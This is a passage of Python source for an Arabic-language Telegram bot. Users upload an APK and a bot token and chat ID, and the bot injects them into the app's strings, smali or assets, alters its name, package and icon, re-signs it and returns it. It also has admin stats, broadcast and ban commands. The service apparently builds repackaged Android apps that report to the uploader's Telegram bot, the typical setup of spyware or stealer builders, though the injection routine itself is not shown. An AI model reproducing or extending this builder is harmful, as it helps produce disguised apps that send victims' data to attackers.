        "/chat — حفظ Chat ID افتراضي\n"
        "/cancel — إلغاء العملية\n"
        "/mykey — إدارة مفتاح التوقيع\n"
        "/stats — إحصائيات (أدمن)\n"
        "/broadcast — رسالة جماعية (أدمن)\n"
        "/users — عدد المستخدمين (أدمن)\n"
        "/ban 123 — حظر (أدمن)\n"
        "/unban 123 — فك الحظر (أدمن)\n"
        "/maintenance on|off (أدمن)\n\n"
        "<b>💡 ملاحظات</b>\n"
        f"• أقصى حجم تحميل من تلجرام {TG_MAX_MB}MB — الأكبر ابعته كرابط\n"
        "• الأوضاع: auto / strings / smali / assets / custom\n"
    )
    await update.message.reply_text(t, parse_mode=ParseMode.HTML)

async def cmd_id(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"🆔 Chat ID بتاعك: <code>{update.effective_chat.id}</code>",
                                    parse_mode=ParseMode.HTML)

# ---------- القائمة ----------

async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    u = update.effective_user
    d = query.data
    upsert_user(u.id, u.username, u.first_name)

    if d == "recheck":
        if await check_join(update, ctx):
            await query.edit_message_text("✅ تمام، اشتركت.", reply_markup=menu_kb(is_admin(u.id)))
        return

    if d == "help":
        await query.edit_message_text("📖 ابعت /help لعرض الأوامر.", reply_markup=menu_kb(is_admin(u.id)))
        return

    if d == "settings":
        usr = get_user(u.id) or {}
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔑 تعديل التوكن الافتراضي", callback_data="set_token")],
            [InlineKeyboardButton("💬 تعديل Chat ID الافتراضي", callback_data="set_chat")],
            [InlineKeyboardButton("🧩 وضع الحقن: " + (ctx.user_data.get("mode", "auto")), callback_data="set_mode")],
            [InlineKeyboardButton("⬅️ رجوع", callback_data="menu")],
        ])
        await query.edit_message_text(
            f"⚙️ <b>الإعدادات</b>\n\n"
            f"🔑 التوكن: <code>{(usr.get('def_token') or 'غير محدد')[:20]}</code>\n"
            f"💬 Chat ID: <code>{usr.get('def_chat') or 'غير محدد'}</code>\n"
            f"🧩 الوضع: <code>{ctx.user_data.get('mode','auto')}</code>",
            parse_mode=ParseMode.HTML, reply_markup=kb)
        return

    if d == "set_mode":
        modes = ["auto", "strings", "smali", "assets"]
        cur = ctx.user_data.get("mode", "auto")
        ctx.user_data["mode"] = modes[(modes.index(cur) + 1) % len(modes)] if cur in modes else "auto"
        await query.edit_message_text(f"🧩 الوضع الحالي: <code>{ctx.user_data['mode']}</code>",
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ رجوع", callback_data="settings")]]))
        return

    if d == "set_token":
        ctx.user_data["st"] = "set_token"
        await query.edit_message_text("🔑 ابعت التوكن الافتراضي:")
        return

    if d == "set_chat":
        ctx.user_data["st"] = "set_chat"
        await query.edit_message_text("💬 ابعت الـ Chat ID الافتراضي:")
        return

    if d == "myks":
        usr = get_user(u.id) or {}
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("📤 رفع keystore", callback_data="up_ks")],
            [InlineKeyboardButton("⬅️ رجوع", callback_data="menu")]])
        await query.edit_message_text(
            f"🔑 <b>مفتاح التوقيع</b>\n\nالحالي: <code>{esc(usr.get('ks_path') or 'الافتراضي')}</code>\n\n"
            "ابعت ملف <code>.jks</code> أو <code>.keystore</code> وسيُستخدم لتوقيع تطبيقاتك.",
            parse_mode=ParseMode.HTML, reply_markup=kb)
        return

    if d == "up_ks":
        ctx.user_data["st"] = "await_ks"
        await query.edit_message_text("📤 ابعت ملف الـ keystore (.jks / .keystore):")
        return

    if d == "menu":
        await query.edit_message_text("🏠 القائمة الرئيسية", reply_markup=menu_kb(is_admin(u.id)))
        return

    # ------- بدء بناء -------
    if d == "build":
        if setting("maintenance") == "1" and not is_admin(u.id):
            await query.edit_message_text("🛠️ البوت في وضع الصيانة، جرب بعدين.")
            return
        ctx.user_data["job"] = {"mode": ctx.user_data.get("mode", "auto")}
        ctx.user_data["st"] = "await_apk"
        await query.edit_message_text(
            "📦 <b>ابعت ملف الـ APK</b>\n\n"
            "• ملف مباشر (حتى " + str(TG_MAX_MB) + "MB)\n"
            "• أو رابط مباشر ينتهي بـ .apk",
            parse_mode=ParseMode.HTML)
        return

    if d == "info":
        ctx.user_data["st"] = "await_info_apk"
        await query.edit_message_text("📦 ابعت الـ APK أو رابط لعرض معلوماته:")
        return

    if d == "sign":
        ctx.user_data["st"] = "await_sign_apk"
        await query.edit_message_text("✍️ ابعت الـ APK لتوقيعه بالمفتاح الافتراضي:")
        return

    # ------- بناء: تعديلات -------
    job = ctx.user_data.get("job", {})

    if d == "edit_name":
        ctx.user_data["st"] = "set_app_name"
        await query.edit_message_text("🏷️ ابعت اسم التطبيق الجديد:")
        return
    if d == "edit_pkg":
        ctx.user_data["st"] = "set_pkg"
        await query.edit_message_text("📛 ابعت اسم الباكيج الجديد (مثال: <code>com.new.app</code>):",
                                      parse_mode=ParseMode.HTML)
        return
    if d == "edit_icon":
        ctx.user_data["st"] = "set_icon"
        await query.edit_message_text("🖼️ ابعت صورة الأيقونة (PNG/JPG مربعة يفضل 512×512):")
        return
    if d == "edit_mode":
        modes = ["auto", "strings", "smali", "assets"]
        cur = job.get("mode", "auto")
        job["mode"] = modes[(modes.index(cur) + 1) % len(modes)] if cur in modes else "auto"
        ctx.user_data["job"] = job
        await query.edit_message_text(f"🧩 وضع الحقن: <code>{job['mode']}</code>",
                                      parse_mode=ParseMode.HTML,
                                      reply_markup=confirm_kb(job))
        return

    if d == "run":
        await run_job(update, ctx)
        return

    if d == "cancel":
        ctx.user_data["job"] = {}
        ctx.user_data["st"] = None
        await query.edit_message_text("❌ تم الإلغاء.", reply_markup=menu_kb(is_admin(u.id)))
        return

    if d == "admin":
        await query.edit_message_text(admin_text(), parse_mode=ParseMode.HTML,
                                      reply_markup=menu_kb(True))
        return

def confirm_kb(job: dict):
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🚀 ابدأ البناء", callback_data="run")],
        [InlineKeyboardButton("🏷️ اسم التطبيق", callback_data="edit_name"),
         InlineKeyboardButton("📛 الباكيج", callback_data="edit_pkg")],
        [InlineKeyboardButton("🖼️ الأيقونة", callback_data="edit_icon"),
         InlineKeyboardButton(f"🧩 {job.get('mode','auto')}", callback_data="edit_mode")],
        [InlineKeyboardButton("❌ إلغاء", callback_data="cancel")],
    ])

def summary_text(job: dict) -> str:
    t = job.get("token", "")
    return (
        "📋 <b>ملخص البناء</b>\n\n"
        f"📦 الملف: <code>{esc(job.get('apk_name','?'))}</code> ({human(job.get('apk_size',0))})\n"
        f"🔑 التوكن: <code>{esc(t[:12])}...{esc(t[-6:]) if t else ''}</code>\n"
        f"💬 Chat ID: <code>{esc(job.get('chat_id','?'))}</code>\n"
        f"🏷️ الاسم: <code>{esc(job.get('app_name') or 'بدون تغيير')}</code>\n"
        f"📛 الباكيج: <code>{esc(job.get('package') or 'بدون تغيير')}</code>\n"
        f"🖼️ أيقونة: {'✅' if job.get('icon_path') else '❌'}\n"
        f"🧩 الوضع: <code>{job.get('mode','auto')}</code>\n"
    )

# ---------- استقبال الملفات ----------

async def download_tg_file(ctx, doc, prefix="in") -> Path:
    tgfile = await ctx.bot.get_file(doc.file_id)
    dest = WORK_DIR / prefix / f"{doc.file_unique_id}_{doc.file_name or 'file.apk'}"
    dest.parent.mkdir(parents=True, exist_ok=True)
    await tgfile.download_to_drive(custom_path=str(dest))
    return dest

def get_url_from_text(text: str):
    m = re.search(r"https?://\S+", text)
    return m.group(0) if m else None

async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    msg = update.message
    if not msg:
        return
    u = update.effective_user
    upsert_user(u.id, u.username, u.first_name)
    st = ctx.user_data.get("st")

    # ---- rate limit ----
    last = _last_cmd.get(u.id, 0)
    if time.time() - last < COOLDOWN and not msg.document:
        _last_cmd[u.id] = time.time()
    else:
        _last_cmd[u.id] = time.time()

    # ---- كولباك الاشتراك ----
    if not await check_join(update, ctx):
        return

    # ================= ملفات =================
    if msg.document:
        doc = msg.document
        name = doc.file_name or "file"
        low = name.lower()

        if st == "await_ks" or low.endswith((".jks", ".keystore")):
            p = await download_tg_file(ctx, doc, "keys")
            ex("UPDATE users SET ks_path=? WHERE uid=?", (str(p), u.id))
            ctx.user_data["st"] = None
            await msg.reply_text(f"✅ تم حفظ المفتاح: <code>{esc(name)}</code>", parse_mode=ParseMode.HTML)
            return

        if low.endswith((".png", ".jpg", ".jpeg", ".webp")) and st == "set_icon":
            p = await download_tg_file(ctx, doc, "icons")
            ctx.user_data["job"]["icon_path"] = str(p)
            ctx.user_data["st"] = None
            await msg.reply_text("✅ تم استلام الأيقونة.", reply_markup=confirm_kb(ctx.user_data["job"]))
            return

        if not low.endswith(".apk"):
            await msg.reply_text("⚠️ ابعت ملف .apk")
            return

        if (doc.file_size or 0) > TG_MAX_MB * 1024 * 1024:
            await msg.reply_text(
                f"⚠️ حجم الملف {human(doc.file_size)} أكبر من حد Bot API ({TG_MAX_MB}MB).\n"
                "ابعته كرابط مباشر.")
            return

        m = await msg.reply_text("⬇️ جاري التحميل...")
        try:
            p = await download_tg_file(ctx, doc)
        except Exception as e:
            await m.edit_text(f"❌ فشل التحميل: {esc(str(e))}", parse_mode=ParseMode.HTML)
            return
        await m.edit_text(f"✅ تم التحميل ({human(doc.file_size)})")

        if st == "await_info_apk":
            await do_info(msg, p, ctx)
            ctx.user_data["st"] = None
            return
        if st == "await_sign_apk":
            await do_sign(msg, p, ctx)
            ctx.user_data["st"] = None
            return

        await start_job_flow(msg, ctx, p, name, doc.file_size)
        return

    # ================= نص =================
    text = (msg.text or "").strip()
    if not text:
        return

    if st == "set_token":
        ctx.user_data["st"] = None
        if not TOKEN_RE.fullmatch(text):
            await msg.reply_text("⚠️ شكل التوكن غير صحيح.")
            return
        ex("UPDATE users SET def_token=? WHERE uid=?", (text, u.id))
        await msg.reply_text("✅ تم حفظ التوكن الافتراضي.")
        return

    if st == "set_chat":
        ctx.user_data["st"] = None
        ex("UPDATE users SET def_chat=? WHERE uid=?", (text, u.id))
        await msg.reply_text("✅ تم حفظ Chat ID الافتراضي.")
        return

    if st == "set_app_name":
        ctx.user_data["job"]["app_name"] = text
        ctx.user_data["st"] = None
        await msg.reply_text("✅ تم.", reply_markup=confirm_kb(ctx.user_data["job"]))
        return

    if st == "set_pkg":
        ctx.user_data["st"] = None
        if not re.fullmatch(r"[a-zA-Z][\w]*(\.[a-zA-Z][\w]*)+", text):
            await msg.reply_text("⚠️ صيغة الباكيج غير صحيحة.")
            return
        ctx.user_data["job"]["package"] = text
        await msg.reply_text("✅ تم.", reply_markup=confirm_kb(ctx.user_data["job"]))
        return

    if st in ("await_token", "await_chat") or st == "await_apk":
        url = get_url_from_text(text)
        if url and (url.lower().endswith(".apk") or "apk" in url.lower()):
            m = await msg.reply_text("⬇️ جاري تحميل الرابط...")
            dest = WORK_DIR / "in" / f"url_{int(time.time())}.apk"
            dest.parent.mkdir(parents=True, exist_ok=True)
            try:
                await asyncio.to_thread(download, url, dest, "APK")
            except Exception as e:
                await m.edit_text(f"❌ فشل التحميل: {esc(str(e))}", parse_mode=ParseMode.HTML)
                return
            await m.edit_text("✅ تم التحميل.")
            await start_job_flow(msg, ctx, dest, dest.name, dest.stat().st_size)
            return

    if st == "await_token":
        if not TOKEN_RE.fullmatch(text):
            await msg.reply_text("⚠️ شكل التوكن غلط. مثال:\n<code>123456789:AAH...</code>",
                                 parse_mode=ParseMode.HTML)
            return
        m = await msg.reply_text("🔎 فحص التوكن...")
        ok, uname = await validate_token(text)
        if not ok:
            await m.edit_text("❌ التوكن مش شغال (getMe فشل). جرب تاني أو ابعت /cancel")
            return
        ctx.user_data["job"]["token"] = text
        usr = get_user(u.id)
        if usr and not usr["def_token"]:
            ex("UPDATE users SET def_token=? WHERE uid=?", (text, u.id))
        await m.edit_text(f"✅ التوكن شغال: @{esc(uname)}")
        await ask_chat(msg, ctx)
        return

    if st == "await_chat":
        if not re.fullmatch(r"-?\d{5,15}", text):
            await msg.reply_text("⚠️ الـ Chat ID أرقام فقط (ممكن يبدأ بـ -).")
            return
        ctx.user_data["job"]["chat_id"] = text
        usr = get_user(u.id)
        if usr and not usr["def_chat"]:
            ex("UPDATE users SET def_chat=? WHERE uid=?", (text, u.id))
        ctx.user_data["st"] = None
        await msg.reply_text(summary_text(ctx.user_data["job"]), parse_mode=ParseMode.HTML,
                             reply_markup=confirm_kb(ctx.user_data["job"]))
        return

    # افتراضي: القائمة
    await msg.reply_text("🏠 اختر من القائمة:", reply_markup=menu_kb(is_admin(u.id)))

async def validate_token(token: str):
    try:
        url = f"https://api.telegram.org/bot{token}/getMe"
        with urllib.request.urlopen(url, timeout=20) as r:
            j = json.loads(r.read())
        if j.get("ok"):
            return True, j["result"]["username"]
    except Exception:
        pass
    return False, ""

async def detect_chat_id(token: str):
    try:
        url = f"https://api.telegram.org/bot{token}/getUpdates"
        with urllib.request.urlopen(url, timeout=20) as r:
            j = json.loads(r.read())
        for upd in reversed(j.get("result", [])):
            for k in ("message", "channel_post", "edited_message"):
                if k in upd:
                    return str(upd[k]["chat"]["id"])
    except Exception:
        pass
    return None

async def ask_chat(msg, ctx):
    ctx.user_data["st"] = "await_chat"
    usr = get_user(msg.from_user.id)
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("🔎 اكتشاف تلقائي", callback_data="detect_chat")]])
    if usr and usr["def_chat"]:
        ctx.user_data["job"]["chat_id"] = usr["def_chat"]
        ctx.user_data["st"] = None
        await msg.reply_text(f"💬 تم استخدام Chat ID المحفوظ: <code>{usr['def_chat']}</code>\n\n"
                             + summary_text(ctx.user_data["job"]),
                             parse_mode=ParseMode.HTML,
                             reply_markup=confirm_kb(ctx.user_data["job"]))
        return
    await msg.reply_text("💬 ابعت الـ Chat ID (أو اضغط اكتشاف تلقائي بعد ما تعمل /start لـ بوتك):",
                         reply_markup=kb)

async def start_job_flow(msg, ctx, path: Path, name: str, size: int):
    u = msg.from_user
    job = ctx.user_data.get("job") or {}
    job.update({"apk_path": str(path), "apk_name": name, "apk_size": size,
                "mode": job.get("mode", "auto")})
    ctx.user_data["job"] = job

    usr = get_user(u.id)
    if usr and usr["def_token"] and usr["def_chat"]:
        job["token"] = usr["def_token"]
        job["chat_id"] = usr["def_chat"]
        ctx.user_data["st"] = None
        await msg.reply_text("📋 " + summary_text(job), parse_mode=ParseMode.HTML,
                             reply_markup=confirm_kb(job))
        return

    if usr and usr["def_token"]:
        job["token"] = usr["def_token"]
        await ask_chat(msg, ctx)
        return

    ctx.user_data["st"] = "await_token"
    await msg.reply_text("🔑 ابعت <b>Bot Token</b> بتاعك (من @BotFather):",
                         parse_mode=ParseMode.HTML)

async def do_info(msg, apk: Path, ctx):
    m = await msg.reply_text("🔎 جاري قراءة المعلومات...")
    try:
        info = await asyncio.to_thread(info_only, apk)
    except Exception as e:
        await m.edit_text(f"❌ فشل: {esc(str(e))}", parse_mode=ParseMode.HTML)
        return
    perms = ", ".join(info["perms"][:25]) or "لا يوجد"
    await m.edit_text(
        f"📦 <b>معلومات الـ APK</b>\n\n"
        f"📛 الباكيج: <code>{esc(info['package'])}</code>\n"
        f"🔢 الإصدار: <code>{esc(info['version'])}</code>\n"
        f"🏷️ الاسم: <code>{esc(info['label'])}</code>\n"
        f"📱 minSdk: <code>{esc(info['min'])}</code> | targetSdk: <code>{esc(info['target'])}</code>\n\n"
        f"🔐 الصلاحيات ({len(info['perms'])}):\n<code>{esc(perms)}</code>",
        parse_mode=ParseMode.HTML)

async def do_sign(msg, apk: Path, ctx):
    m = await msg.reply_text("✍️ جاري التوقيع...")
    ok, res, out = await asyncio.to_thread(sign_only, apk)
    if not ok:
        await m.edit_text(f"❌ فشل التوقيع:\n<code>{esc(out[-600:])}</code>", parse_mode=ParseMode.HTML)
        return
    await m.edit_text("✅ تم التوقيع.")
    with open(res, "rb") as f:
        await msg.reply_document(InputFile(f, filename=Path(res).name),
                                 caption="✅ APK موقّع")

# ---------- تنفيذ المهمة ----------

async def run_job(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    chat_id = update.effective_chat.id
    job = ctx.user_data.get("job") or {}
    if not job.get("apk_path") or not job.get("token") or not job.get("chat_id"):
        await query.edit_message_text("⚠️ بيانات ناقصة، ابدأ من الأول.")
        return

    ctx.user_data["st"] = None
    msg = await ctx.bot.send_message(chat_id, "⏳ بدء البناء...")
    loop = asyncio.get_running_loop()
    prog = Progress(ctx.bot, chat_id, msg.message_id, loop)

    async with BUILD_SEM:
        jid = ex("INSERT INTO jobs(uid,kind,name,status,created) VALUES(?,?,?,?,?)",
                 (update.effective_user.id, "build", job.get("apk_name"), "running", now()))
        ok, result, logs = await loop.run_in_executor(None, do_build, job, prog)
        ex("UPDATE jobs SET status=?, log=? WHERE id=?", ("done" if ok else "failed", logs[-6000:], jid))

    if not ok:
        await safe_edit(ctx.bot, chat_id, msg.message_id,
                        f"❌ <b>فشل البناء</b>\n\n<code>{esc(result)}</code>\n\n"
                        f"<code>{esc(logs[-1200:])}</code>")
        return

    size = Path(result).stat().st_size
    await safe_edit(ctx.bot, chat_id, msg.message_id,
                    f"✅ <b>تم البناء بنجاح</b>\n\n📦 {human(size)}\n"
                    f"🔑 <code>{esc(job['token'][:14])}...</code>\n"
                    f"💬 <code>{esc(job['chat_id'])}</code>")
    with open(result, "rb") as f:
        await ctx.bot.send_document(chat_id, InputFile(f, filename=Path(result).name),
                                    caption="✅ APK جاهز — التوكن و Chat ID محقونين.")
    ex("UPDATE users SET builds=builds+1 WHERE uid=?", (update.effective_user.id,))
    if logs and "REPORT" in logs:
        rep = logs.split("REPORT:", 1)[1].strip().splitlines()[:15]
        if rep:
            await ctx.bot.send_message(chat_id, "🔎 <b>تفاصيل الحقن</b>\n<code>"
                                      + esc("\n".join(rep)) + "</code>", parse_mode=ParseMode.HTML)

# ---------- أوامر الأدمن ----------

def admin_text():
    usr = q("SELECT COUNT(*) c FROM users", one=True)["c"]
    builds = q("SELECT COUNT(*) c FROM jobs WHERE status='done'", one=True)["c"]
    fails = q("SELECT COUNT(*) c FROM jobs WHERE status='failed'", one=True)["c"]
    return (f"🛠️ <b>لوحة الأدمن</b>\n\n👥 المستخدمين: <b>{usr}</b>\n"
            f"✅ نجحت: <b>{builds}</b>\n❌ فشلت: <b>{fails}</b>\n"
            f"🔧 صيانة: <b>{'ON' if setting('maintenance')=='1' else 'OFF'}</b>")

async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return await update.message.reply_text("⛔ للأدمن فقط")
    await update.message.reply_text(admin_text(), parse_mode=ParseMode.HTML)

async def cmd_users(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    rows = q("SELECT uid,username,first_name,builds FROM users ORDER BY builds DESC LIMIT 30")
    t = "\n".join(f"<code>{r['uid']}</code> @{esc(r['username'] or '-')} — {r['builds']} بناء" for r in rows)
    await update.message.reply_text(f"👥 <b>أعلى المستخدمين</b>\n{t}", parse_mode=ParseMode.HTML)

async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    txt = update.message.text.partition(" ")[2]
    if not txt:
        return await update.message.reply_text("الاستخدام: /broadcast نص الرسالة")
    rows = q("SELECT uid FROM users")
    ok = 0
    m = await update.message.reply_text(f"📤 جاري الإرسال لـ {len(rows)}...")
    for r in rows:
        try:
            await ctx.bot.send_message(r["uid"], txt, parse_mode=ParseMode.HTML)
            ok += 1
        except Exception:
            pass
        await asyncio.sleep(0.05)
    await m.edit_text(f"✅ تم الإرسال لـ {ok}/{len(rows)}")

async def cmd_ban(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    arg = update.message.text.partition(" ")[2].strip()
    if arg.isdigit():
        ex("UPDATE users SET banned=1 WHERE uid=?", (int(arg),))
        await update.message.reply_text(f"🚫 تم حظر {arg}")

async def cmd_unban(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    arg = update.message.text.partition(" ")[2].strip()
    if arg.isdigit():
        ex("UPDATE users SET banned=0 WHERE uid=?", (int(arg),))
        await update.message.reply_text(f"✅ تم فك الحظر عن {arg}")

async def cmd_maintenance(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    arg = update.message.text.partition(" ")[2].strip().lower()
    set_setting("maintenance", "1" if arg in ("on", "1", "yes") else "0")
    await update.message.reply_text(f"🔧 الصيانة: {'ON' if arg in ('on','1','yes') else 'OFF'}")

async def cmd_cancel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ctx.user_data.clear()
    await update.message.reply_text("❌ تم الإلغاء.", reply_markup=menu_kb(is_admin(update.effective_user.id)))

async def cmd_token(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    t = update.message.text.partition(" ")[2].strip()
    if not t:
        return await update.message.reply_text("الاستخدام: /token <TOKEN>")
    ex("UPDATE users SET def_token=? WHERE uid=?", (t, update.effective_user.id))
    await update.message.reply_text("✅ تم حفظ التوكن.")

async def cmd_chat(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    c = update.message.text.partition(" ")[2].strip()
    if not c:
        return await update.message.reply_text("الاستخدام: /chat <CHAT_ID>")
    ex("UPDATE users SET def_chat=? WHERE uid=?", (c, update.effective_user.id))
    await update.message.reply_text("✅ تم حفظ Chat ID.")

async def on_cb_detect(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data != "detect_chat":
        return
    tok = (ctx.user_data.get("job") or {}).get("token")
    if not tok:
        return await query.edit_message_text("⚠️ ابدأ من الأول.")
    m = await query.edit_message_text("🔎 جاري الاكتشاف...")
    cid = await detect_chat_id(tok)
    if not cid:
        ctx.user_data["st"] = "await_chat"
        return await m.edit_text("❌ مفيش تحديثات. اعمل /start لـ بوتك ثم ابعت Chat ID يدويًا.")
    ctx.user_data["job"]["chat_id"] = cid
    ctx.user_data["st"] = None
    await m.edit_text("📋 " + summary_text(ctx.user_data["job"]),
                      parse_mode=ParseMode.HTML,
                      reply_markup=confirm_kb(ctx.user_data["job"]))

# ---------- تشغيل ----------

async def post_init(app: Application):
    await app.bot.set_my_commands([
        BotCommand("start", "القائمة الرئيسية"),
        BotCommand("build", "بناء APK جديد"),
        BotCommand("id", "Chat ID بتاعك"),
        BotCommand("help", "المساعدة"),
        BotCommand("cancel", "إلغاء"),
    ])
    me = await app.bot.get_me()
    log.info(f"✅ البوت شغال: @{me.username}")

def cleanup_old():
    cutoff = time.time() - 6 * 3600
    for d in WORK_DIR.rglob("*"):
        try:
            if d.is_dir() and d.stat().st_mtime < cutoff and d.name.startswith(("build_", "info_")):
                shutil.rmtree(d, ignore_errors=True)
        except Exception:
            pass

def main():
    if not BOT_TOKEN:
        print("BOT_TOKEN missing in env")
        sys.exit(1)

    db_init()
    termux_check()
    if os.getenv("SKIP_BOOTSTRAP") != "1":
        ensure_tools()
    else:
        find_java()
    cleanup_old()

    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("id", cmd_id))
    app.add_handler(CommandHandler("build", lambda u, c: on_callback_fake_build(u, c)))
    app.add_handler(CommandHandler("cancel", cmd_cancel))
    app.add_handler(CommandHandler("token", cmd_token))
    app.add_handler(CommandHandler("chat", cmd_chat))
    app.add_handler(CommandHandler("stats", cmd_stats))
    app.add_handler(CommandHandler("users", cmd_users))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CommandHandler("ban", cmd_ban))
    app.add_handler(CommandHandler("unban", cmd_unban))
    app.add_handler(CommandHandler("maintenance", cmd_maintenance))
    app.add_handler(CallbackQueryHandler(on_cb_detect, pattern="^detect_chat$"))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, on_message))

    log.info("🎯 بدء الـ polling ...")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

async def on_callback_fake_build(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    ctx.user_data["job"] = {"mode": ctx.user_data.get("mode", "auto")}
    ctx.user_data["st"] = "await_apk"
    await update.message.reply_text("📦 ابعت ملف الـ APK أو رابط مباشر.")

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "bootstrap":
        ensure_tools()
        print("✅ الأدوات جاهزة")
    else:
        main()